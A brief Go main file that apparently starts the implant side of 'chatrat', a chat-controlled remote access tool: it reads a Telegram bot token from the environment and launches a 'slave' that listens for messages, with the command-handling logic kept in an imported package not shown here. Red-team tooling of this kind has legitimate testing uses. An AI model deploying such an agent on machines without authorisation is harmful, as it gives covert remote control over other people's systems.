package main

import (
	"os"

	"github.com/CoveoSec/chatrat/pkg/core"
	"github.com/joho/godotenv"
	"github.com/lithammer/shortuuid/v4"
)

func main() {
	godotenv.Load()

	token := os.Getenv("SLAVE_API_KEY")
	id := shortuuid.New()
	botType := "telegram"

	slave := core.NewSlave(token, botType, id)
	slave.ReceiveMessage()

}
